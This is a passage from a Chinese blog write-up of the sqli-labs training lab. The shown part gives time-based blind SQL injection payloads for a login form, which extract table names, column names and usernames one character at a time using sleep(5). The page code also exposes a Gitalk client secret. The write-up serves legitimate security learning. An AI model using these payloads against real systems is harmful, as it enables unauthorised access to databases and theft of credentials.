class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">#</span></span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//<span class="keyword">security</span>下第一个表名的第一个字符  <span class="number">101</span>-》e</span><br><span class="line">uname:<span class="keyword">admin</span><span class="string">' and if(ascii(substr((select table_name from information_schema.tables where table_schema='</span><span class="keyword">security</span><span class="string">' limit 0,1),2,1))=108,1,sleep(5))#</span></span><br><span class="line"><span class="string">passwd:1</span></span><br><span class="line"><span class="string">//security下第一个表名的第二个字符  108-》m</span></span><br><span class="line"><span class="string">....</span></span><br><span class="line"><span class="string">逐步猜测表名为emails</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname:admin'</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">#</span></span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//<span class="keyword">security</span>下第二个表名的第一个字符  <span class="number">114</span>-》r</span><br><span class="line">......</span><br><span class="line">逐步猜测所有表名</span><br><span class="line"></span><br><span class="line">uname:<span class="keyword">admin</span><span class="string">' and if(ascii(substr((select column_name from information_schema.columns where table_name='</span><span class="keyword">users</span><span class="string">' limit 0,1),1,1))=105,1,sleep(5))#</span></span><br><span class="line"><span class="string">passwd:1</span></span><br><span class="line"><span class="string">//猜测表中第一个列名的第一个字符 105-》i</span></span><br><span class="line"><span class="string">.....</span></span><br><span class="line"><span class="string">逐步猜测出所有列名</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uname:admin'</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">#</span></span><br><span class="line">passwd:<span class="number">1</span></span><br><span class="line">//猜测username的第一行中的第一位 <span class="number">69</span>-》D </span><br><span class="line">.....</span><br><span class="line">逐步猜测出所有的用户名和密码</span><br></pre></td></tr></table></figure></div><div class="post-copyright"><blockquote><p>原文作者: fzykn06</p><p>原文链接: <a href="http://fzykn06.github.io/2019/12/27/sqli-labs-writeup/">http://fzykn06.github.io/2019/12/27/sqli-labs-writeup/</a></p><p>版权声明: 转载请注明出处(必须保留作者署名及链接)</p></blockquote></div><div class="tags"></div><div class="post-share"><div class="social-share"><span>分享到:</span></div><div data-thread-key="2019/12/27/sqli-labs-writeup/" data-title="sqli-labs-writeup" data-url="http://fzykn06.github.io/2019/12/27/sqli-labs-writeup/" class="ds-share flat"><div class="ds-share-inline"><ul class="ds-share-icons-16"><li data-toggle="ds-share-icons-more"><a href="javascript:void(0);" class="ds-more">分享到:</a></li><li><a href="javascript:void(0);" data-service="weibo" class="ds-weibo">微博</a></li><li><a href="javascript:void(0);" data-service="qzone" class="ds-qzone">QQ空间</a></li><li><a href="javascript:void(0);" data-service="qqt" class="ds-qqt">腾讯微博</a></li><li><a href="javascript:void(0);" data-service="wechat" class="ds-wechat">微信</a></li></ul><div class="ds-share-icons-more"></div></div></div><div class="bdsharebuttonbox"><span style="float:left;line-height: 28px;height: 28px;font-size:16px;font-weight:blod">分享到:</span><a href="#" data-cmd="more" class="bds_more"></a><a href="#" data-cmd="mshare" title="分享到一键分享" class="bds_mshare"></a><a href="#" data-cmd="fbook" title="分享到Facebook" class="bds_fbook"></a><a href="#" data-cmd="twi" title="分享到Twitter" class="bds_twi"></a><a href="#" data-cmd="linkedin" title="分享到linkedin" class="bds_linkedin"></a><a href="#" data-cmd="youdao" title="分享到有道云笔记" class="bds_youdao"></a><a href="#" data-cmd="evernotecn" title="分享到印象笔记" class="bds_evernotecn"></a><a href="#" data-cmd="weixin" title="分享到微信" class="bds_weixin"></a><a href="#" data-cmd="qzone" title="分享到QQ空间" class="bds_qzone"></a><a href="#" data-cmd="tsina" title="分享到新浪微博" class="bds_tsina"></a></div><div class="jiathis_style"><span class="jiathis_txt">分享到:</span><a class="jiathis_button_tsina"></a><a class="jiathis_button_qzone"></a><a class="jiathis_button_weixin"></a><a class="jiathis_button_fb"></a><a class="jiathis_button_linkedin"></a><a class="jiathis_button_twitter"></a><a class="jiathis_button_ydnote"></a><a href="http://www.jiathis.com/share" target="_blank" rel="noopener" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis"></a><a class="jiathis_counter_style"></a></div></div><div class="post-nav"><a href="/2019/09/28/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E8%80%83%E6%A0%B8%E9%83%A8%E5%88%86writeup/" class="next">实验室考核部分writeup</a></div><div id="comments"><div id="container"><script type="text/javascript" src="https://unpkg.com/gitalk/dist/gitalk.min.js?v=2.0.4"></script><script type="text/javascript" src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js?v=2.0.4"></script><script>var gitalk = new Gitalk({
  clientID: '1817bee0e9bebbfec568',
  clientSecret: '0fed554209288ad9037d80cb0f5512d26423ad31',
  repo: 'fzykn06.github.io',
  owner: 'fzykn06',
  admin: ['fzykn06'],
  id: md5(window.location.pathname),
  distractionFreeMode: false,
  language: 'zh-CN',
  pagerDirection: 'last'
})
gitalk.render('container')</script></div></div></div></div></div><div class="layout-r"><div id="sidebar"><div class="search-pla"></div><div id="toc" class="widget"><div class="widget-title"><i class="fa fa-fei">文章目录</i></div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#基础知识"><span class="toc-text">基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql注入分类"><span class="toc-text">sql注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基于从服务器接收到的响应"><span class="toc-text">基于从服务器接收到的响应</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于如何处理输入的SQL查询（数据类型）"><span class="toc-text">基于如何处理输入的SQL查询（数据类型）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于程度和顺序的注入"><span class="toc-text">基于程度和顺序的注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常用知识点"><span class="toc-text">常用知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#常用函数："><span class="toc-text">常用函数：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符串连接函数"><span class="toc-text">字符串连接函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一般的尝试性语句"><span class="toc-text">一般的尝试性语句</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#union查询"><span class="toc-text">union查询</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-union语法"><span class="toc-text">sql union语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sql-union-all语法"><span class="toc-text">sql union all语法</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqli-labs"><span class="toc-text">sqli-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Basic"><span class="toc-text">Basic</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#基础注入"><span class="toc-text">基础注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#less1"><span class="toc-text">less1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less2"><span class="toc-text">less2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less3"><span class="toc-text">less3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less4"><span class="toc-text">less4</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注"><span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#基于布尔sql盲注——通过构造逻辑判断"><span class="toc-text">基于布尔sql盲注——通过构造逻辑判断</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#基于报错的sql盲注–构造playload让信息通过错误提示回显出来"><span class="toc-text">基于报错的sql盲注–构造playload让信息通过错误提示回显出来</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#基于时间的SQL盲注–延时注入"><span class="toc-text">基于时间的SQL盲注–延时注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less5"><span class="toc-text">less5</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less6"><span class="toc-text">less6</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Background-3-导入与导出相关操作"><span class="toc-text">Background-3 导入与导出相关操作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#load-file-导出文件"><span class="toc-text">load_file()导出文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#文件导入到数据库"><span class="toc-text">文件导入到数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#导入到文件"><span class="toc-text">导入到文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less7"><span class="toc-text">less7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less8"><span class="toc-text">less8</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less9"><span class="toc-text">less9</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less10"><span class="toc-text">less10</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less11"><span class="toc-text">less11</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less12"><span class="toc-text">less12</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less13"><span class="toc-text">less13</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less14"><span class="toc-text">less14</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#less15"><span class="toc-text">less15</span></a></li></ol></li></ol></li></ol></li></ol></div><div class="widget"><div class="widget-title"><i class="fa fa-xie"> 最新文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/12/27/sqli-labs-writeup/">sqli-labs-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/28/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E8%80%83%E6%A0%B8%E9%83%A8%E5%88%86writeup/">实验室考核部分writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/16/%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AF%BE%E8%AE%BE-%E5%9F%BA%E4%BA%8Ephp%E4%B8%8Ehtml%E7%9A%84cpu%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/">网络操作系统课设--基于php与html的cpu调度算法</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/19/ubuntu16-04-%E6%90%AD%E5%BB%BAemail%E6%9C%8D%E5%8A%A1%E5%99%A8/">ubuntu16.04 搭建email服务器</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/16/ISCC2019%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">ISCC2019部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/11/ubuntu16-04-%E6%90%AD%E5%BB%BAftp%E6%9C%8D%E5%8A%A1%E5%99%A8/">ubuntu16.04 搭建ftp服务器</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/05/ubuntu16-04-%E6%90%AD%E5%BB%BAWeb%E6%9C%8D%E5%8A%A1%E5%99%A8/">ubuntu16.04 搭建Web服务器</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/25/Ubuntu-16-04-%E6%90%AD%E5%BB%BADNS%E6%9C%8D%E5%8A%A1%E5%99%A8/">Ubuntu 16.04 搭建DNS服务器</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/21/ubuntu-16-04-%E6%90%AD%E5%BB%BADHCP%E6%9C%8D%E5%8A%A1%E5%99%A8/">ubuntu 16.04 搭建DHCP服务器</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/windows%E4%B8%8A%E4%BD%BF%E7%94%A8hexo-github-%E6%90%AD%E5%BB%BA%E6%9C%AC%E5%9C%B0%E5%8D%9A%E5%AE%A2/">windows上使用hexo + github 搭建本地博客</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-biao"> 标签</i></div><div class="tagcloud"><a href="/tags/Subject/" style="font-size: 15px;">Subject</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/start/" style="font-size: 15px;">start</a> <a href="/tags/ctf/" style="font-size: 15px;">ctf</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-archive"> 归档</i></div><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">10</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-you"> 友情链接</i></div><ul></ul><a href="https://nikoeurus.github.io/" title="Somnus's blog" target="_blank">Somnus's blog</a></div></div></div></div><a id="totop" href="#top"></a><div id="footer"><div class="footer-info"><p><a href="/baidusitemap.xml">网站地图</a> |  <a href="/atom.xml">订阅本站</a> |  <a href="/about/">联系博主</a></p><p>本站总访问量：<i id="busuanzi_container_site_pv"><i id="busuanzi_value_site_pv"></i></i>次，本站总访客数:<i id="busuanzi_container_site_uv"><i id="busuanzi_value_site_uv"></i></i>人</p><p><span> Copyright &copy;<a href="/." rel="nofollow">fzykn06.</a></span><span> Theme by<a rel="nofollow" target="_blank" href="https://github.com/chaooo/hexo-theme-BlueLake"> BlueLake.</a></span><span> Count by<a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener"> busuanzi.</a></span><span> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a></span></p></div></div></div><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="/js/search.json.js?v=2.0.4"></script><script type="text/javascript" src="/js/toctotop.js?v=2.0.4" async></script><link rel="stylesheet" type="text/css" href="/share/css/share.css"><script type="text/javascript" src="/share/js/social-share.js" charset="utf-8"></script><script type="text/javascript" src="/share/js/qrcode.js" charset="utf-8"></script><script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":["mshare","weixin","tsina","qzone","linkedin","fbook","twi","print","renren","sqq","evernotecn","bdysc","tqq","tqf","bdxc","kaixin001","tieba","douban","bdhome","thx","ibaidu","meilishuo","mogujie","diandian","huaban","duitang","hx","fx","youdao","sdo","qingbiji","people","xinhua","mail","isohu","yaolan","wealink","ty","iguba","h163","copy"],"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{},"image":{"viewList":["tsina","qzone","weixin","fbook","twi","linkedin","youdao","evernotecn","mshare"],"viewText":"分享到：","viewSize":"16"},"selectShare":{"bdContainerClass":null,"bdSelectMiniList":["tsina","qzone","weixin","fbook","twi","linkedin","youdao","evernotecn","mshare"]}};with(document)0[(getElementsByTagName('head')[0]||head).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
</script><script>var jiathis_config={
    data_track_clickback:true,
    summary:"",
    shortUrl:true,
    hideMore:false
}</script><script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script></body></html>